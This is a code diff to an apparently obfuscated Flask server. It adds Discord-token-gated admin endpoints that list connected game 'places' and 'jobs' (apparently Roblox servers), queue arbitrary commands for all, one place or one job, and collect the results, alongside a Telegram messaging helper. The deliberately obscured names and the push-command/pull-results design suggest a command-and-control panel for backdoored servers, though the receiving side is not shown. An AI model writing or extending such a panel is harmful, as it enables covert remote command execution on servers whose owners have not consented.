@@ -99,6 +99,75 @@ def _h3():
         })
     return jsonify({"ok": True})
 
+def _auth_discord():
+    _auth = request.headers.get("Authorization", "")
+    if not _auth.startswith("Bearer "):
+        return None
+    _tok = _auth[7:]
+    try:
+        _r = requests.get("https://discord.com/api/users/@me",
+                          headers={"Authorization": "Bearer " + _tok}, timeout=10)
+        if _r.status_code != 200:
+            return None
+        _uid = _r.json().get("id")
+        if str(_uid) != str(_k2):
+            return None
+        return _r.json()
+    except:
+        return None
+
+@_a1.route("/admin/servers", methods=["GET"])
+def _hadmin_servers():
+    if not _auth_discord():
+        return jsonify({"error": "access denied"}), 403
+    with _a4:
+        _out = []
+        for _p, _info in _a5.items():
+            _out.append({
+                "place": _p,
+                "name": _info.get("name", "Unknown"),
+                "jobs": [
+                    {
+                        "job": _j,
+                        "players": _ji["players"],
+                        "max": _ji["max"],
+                        "mode": _ji.get("mode", "Server"),
+                        "idx": _ji.get("idx")
+                    }
+                    for _j, _ji in _info.get("jobs", {}).items()
+                ]
+            })
+    return jsonify(_out)
+
+@_a1.route("/admin/send", methods=["POST"])
+def _hadmin_send():
+    if not _auth_discord():
+        return jsonify({"error": "access denied"}), 403
+    _d = request.json or {}
+    _cmd = (_d.get("cmd") or "").strip()
+    _tgt = _d.get("target", "all")
+    _place = _d.get("place")
+    _job = _d.get("job")
+    if not _cmd:
+        return jsonify({"error": "empty"}), 400
+    with _a4:
+        if _tgt == "all":
+            _a2.append({"cmd": _cmd, "target": "all", "ts": time.time()})
+        elif _tgt == "place":
+            _a2.append({"cmd": _cmd, "target": "place", "place": _place, "ts": time.time()})
+        elif _tgt == "job":
+            _a2.append({"cmd": _cmd, "target": "job", "job": _job, "ts": time.time()})
+    return jsonify({"ok": True})
+
+@_a1.route("/admin/results", methods=["GET"])
+def _hadmin_results():
+    if not _auth_discord():
+        return jsonify({"error": "access denied"}), 403
+    with _a4:
+        _out = _a3[:]
+        _a3.clear()
+    return jsonify(_out)
+
 def _s1(_t, _kb=None, _to=None):
     _target = _to if _to else _k2
     _data = {"chat_id": _target, "text": _t[:4000]}
